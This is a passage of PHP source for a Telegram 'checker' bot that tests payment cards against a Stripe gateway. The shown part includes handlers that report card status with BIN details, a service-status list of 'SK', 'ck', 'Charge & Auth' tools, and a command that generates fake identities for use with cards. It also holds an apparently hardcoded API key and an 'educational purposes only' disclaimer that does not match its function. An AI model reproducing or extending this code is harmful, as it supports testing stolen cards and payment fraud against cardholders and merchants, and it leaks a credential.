                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
    
                    else {
                      sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                      sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
                      sendLog($chatId, "<b>BUG REPORTED /CK</b>\n<b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                      }
                    }
  //==================[info Command]==================//
  elseif (strpos($message, "/info") === 0){
    sendMessage($chatId, "<u>ID:</u> <code>$userId</code>\n<u>First Name:</u> $firstname\n<u>Username:</u> @$usernamee\n\n<b>Bot Made by: Stowe .</b>", $message_id);
    }
  //==================[log Command]==================//
  elseif (strpos($message, "/log") === 0){
    sendMessage($chatId, "<b>✅ Update V3.0 info</b>\n\n
      <b>Update stripe API to V2.1</b>\n
      <code>(bug old version still there) API V3 will update soon </code>\n
      <b>Added SK tool</b>\n
      <code>Pm_page, balance, integration check</code>\n
      <b>Fixed crital bug #1</b>\n
      <code>Respone body was force to HTML mode. This mean to end user maybe show message not correctly</code>\n", $message_id);
    }
    //==================[beu Command]==================//
    elseif (strpos($message, "/beu") === 0){
      sendMessage($chatId, "<b>⚠️ BEFORE YOU USE ⚠️</b> \n\n
      ℹ️ <b>This bot make for educational purposes and should not be used for any illegal or unethical activities.</b> The information and code provided are for learning and understanding purposes only. It is important to respect the terms of service and guidelines of any platform or service you interact with.\n 
      Using this bot or any code snippets provided responsibly and in compliance with applicable laws and regulations is the responsibility of the user. The creators and maintainers of this bot are not liable for any misuse or illegal activities conducted with the help of this bot.\n
      Remember to always seek proper authorization and permissions before interacting with any third-party services or systems. Be mindful of privacy, security, and ethical considerations when using the bot or any code provided . <b>education purpse only</b>", $message_id);
      }
    //==================[gpt Command]==================//
    elseif (strpos($message, "/gpt") === 0){
      $text = substr($message, 5);
      $data = '{
        "model": "text-davinci-003",
        "prompt": "'.$text.'",
        "max_tokens": 300,
        "temperature": 0
      }';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.openai.com/v1/completions');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Authorization: Bearer sk-XZJtVHGdmH436EkRHLyviZMtSjodB4gByQJwyYxPmBE1xI1QJOniu'
    ));
    $response = curl_exec($ch);
    $response = json_decode($response, true);
    $result = $response['choices'][0]['text'];
    $text1 = trim($result);
    
    sendMessage($chatId, "$text1", $message_id);
    }
    //==================[inf Command]==================//
    elseif (strpos($message, "/inf") === 0){
      $ct = substr($message, 5);
      $get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$ct.'');
      preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
      $name = $matches1[1][0];
      preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
      $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $postcode = $matches1[1][0];
    sendMessage($chatId, "<b>Your Random info</b>\n\n<b>ℹ️ Country info: <code>$ct</code></b>\n<b>👤 First name -» <code>$name</code></b>\n<b>👤 Last name -» <code>$last</code></b>\n<b>🏠 Address -» <code>$street</code></b>\n<b>City -» <code>$city</code></b>\n<b>🚏 State -» <code>$state</code></b>\n<b>📌 Zip code -» <code>$postcode</code></b>\n<b>📧 Email -» <code>$email</code></b>\n<b>☎️Phone number -» <code>$phone</code></b>\n\n <b>⋆ Request By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    }
    //==================[sta Command]==================//
    elseif (strpos($message, "/sta") === 0){
      sendMessage($chatId, "<b>❕Service status❕</b>\n <b>SK Tool:</b>Alaways ON ✅ \n\n Card Tool \n <b>AGT:</b>Alaways ON ✅\n<b>ck & NK:</b>Alaways ON ✅ \n <b>Charge & Auth</b>ON ✅", $message_id);
      }
//===================================================================//
function sendMessage($chatId, $message, $message_id) {
    $url = $GLOBALS['website'] . "/sendMessage";

    $postData = array(
        'chat_id' => $chatId,
        'text' => $message,
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'HTML'
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function sendLog($chatId, $message, $message_id) {
  $url = $GLOBALS['website'] . "/sendMessage";

  $postData = array(
      'chat_id' => $chatId,
      'text' => $message,
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'HTML'
  );

  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
}
function sendPhoto($chatId, $photoUrl, $caption = "") {
  $url = $GLOBALS['website'] . "/sendPhoto";
  $postData = array(
      'chat_id' => $chatId,
      'photo' => $photoUrl,
      'caption' => $caption
  );

  $options = array(
      'http' => array(
          'header' => "Content-Type:multipart/form-data",
          'method' => "POST",
          'content' => http_build_query($postData),
      ),
  );
  $context = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  return $result;
}
